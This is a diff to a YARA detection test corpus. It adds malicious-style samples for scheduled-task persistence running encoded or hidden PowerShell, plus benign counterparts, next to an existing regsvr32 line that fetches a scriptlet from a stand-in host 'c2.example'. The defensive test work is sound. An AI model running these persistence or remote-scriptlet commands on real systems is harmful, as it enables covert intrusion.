@@ -95,6 +95,35 @@ def build_yara_corpus() -> list[YaraSample]:
             b"regsvr32.exe /i:http://c2.example/b.sct scrobj.dll",
             frozenset({"Titan_Regsvr32_Remote_Scriptlet"}),
         ),
+        YaraSample(
+            "schtasks_encoded_powershell",
+            (
+                b"schtasks.exe /create /tn CacheUpdate /sc onlogon "
+                b'/tr "powershell.exe -EncodedCommand SQBFAFgA" /f'
+            ),
+            frozenset(
+                {
+                    "Titan_Encoded_Command_Invocation",
+                    "Titan_Scheduled_Task_Suspicious_Execution",
+                }
+            ),
+        ),
+        YaraSample(
+            "register_scheduled_task_hidden_powershell",
+            (
+                b"$a=New-ScheduledTaskAction -Execute 'powershell.exe' "
+                b"-Argument '-WindowStyle Hidden'; "
+                b"$t=New-ScheduledTaskTrigger -AtStartup; "
+                b"Register-ScheduledTask -TaskName 'Updater' "
+                b"-Action $a -Trigger $t"
+            ),
+            frozenset(
+                {
+                    "Titan_Encoded_Command_Invocation",
+                    "Titan_Scheduled_Task_Suspicious_Execution",
+                }
+            ),
+        ),
         YaraSample("benign_readme", b"This project contains ordinary documentation."),
         YaraSample("benign_powershell", b"Open PowerShell and run Get-Help."),
         YaraSample("benign_webclient", b"The Net.WebClient API is deprecated."),
@@ -110,4 +139,22 @@ def build_yara_corpus() -> list[YaraSample]:
         ),
         YaraSample("benign_regsvr32", b"regsvr32 /s local-component.dll"),
         YaraSample("benign_scrobj", b"Windows includes the scrobj.dll component."),
+        YaraSample("benign_schtasks_query", b"schtasks.exe /query /fo list"),
+        YaraSample(
+            "benign_scheduled_backup",
+            (
+                b"schtasks.exe /create /tn DailyBackup /sc onlogon "
+                b'/tr "C:\\Program Files\\Backup\\backup.exe" /f'
+            ),
+        ),
+        YaraSample(
+            "benign_scheduled_maintenance",
+            (
+                b"$a=New-ScheduledTaskAction -Execute 'powershell.exe' "
+                b"-Argument '-NoProfile -File C:\\Admin\\Rotate-Logs.ps1'; "
+                b"$t=New-ScheduledTaskTrigger -AtStartup; "
+                b"Register-ScheduledTask -TaskName 'LogRotation' "
+                b"-Action $a -Trigger $t"
+            ),
+        ),
     ]
